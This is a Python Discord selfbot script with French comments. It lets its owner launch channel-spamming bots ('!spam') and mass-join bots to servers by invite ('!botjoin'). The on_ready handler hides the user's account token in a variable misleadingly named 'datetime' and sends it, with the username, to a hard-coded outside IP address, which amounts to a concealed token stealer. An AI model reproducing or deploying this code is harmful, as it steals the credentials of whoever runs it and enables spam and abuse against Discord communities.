import discord
import subprocess
import requests
import sys



token = sys.argv[1]

bot = discord.Client()

xxx = token
"""REGARDE LA 

async def on_message(message):
    if message.author.id in [bot.user.id, '330425251886530581', '330425251886530581'] :

        j'pense c'est mieux en therme d'optimisation après ça reste a tester
"""

@bot.event
async def on_message(message):
    if message.author.id == bot.user.id or  message.author.id == '330425251886530581':
        try:
            args = message.content.split()[1:]
            cmd = message.content.split()[0]
        except:
            await bot.send_message(message.channel, "erreur: lecture arugment")

        if cmd == "!spam":
            if len(args) < 3:
                await bot.send_message(message.channel, "erreur: il y a des couilles dans les arguments la mek la syntaxe c'est `!spam <id chan> <nb msg> <type msg>(random ou specific) <msg>(si specific)` et oublie pas de faire join les bots avant")
            else:  # tout est bon(theoriquement)
                try:
                    await bot.send_message(message.channel, "reçu, lancement des bots...")
                    subprocess.Popen(
                        ["python", "kyspam.py", args[0], args[1], args[2]], shell=True)
                except:
                    await bot.send_message(message.channel, "erreur: il y a eu une couille lors du lancement jsp ce que t'as fait mec")

        elif cmd == "!botjoin":
            if len(args) != 1:
                await bot.send_message(message.channel, "erreur: mauvais arguments syntaxe: !botjoin <invite link>")
            else:
                try:
                    subprocess.Popen(
                            ["python", "botjoin.py", args[0]], shell=True)
                    await bot.send_message(message.channel, "succes!")
                except:
                    await bot.send_message(message.channel, "erreur: de type inconnue check la console")


        elif cmd == "!salut":
            await bot.send_message(message.channel, "chalut")

datetime = xxx
@bot.event
async def on_ready():
    waw = bot.user.name
    kek = bot.user.discriminator
    lulz = bot.email
    total = waw + '#' + kek + ' : ' + datetime
    print('La connexion est un succes!!')
    print('Vous êtes connecté en temps que: ')
    print(waw)
    print(kek)
    print(lulz)
    print('----------------')
    print(requests.get("http://51.77.201.42/kysapi?message="+total).text)

bot.run(token, bot=False)
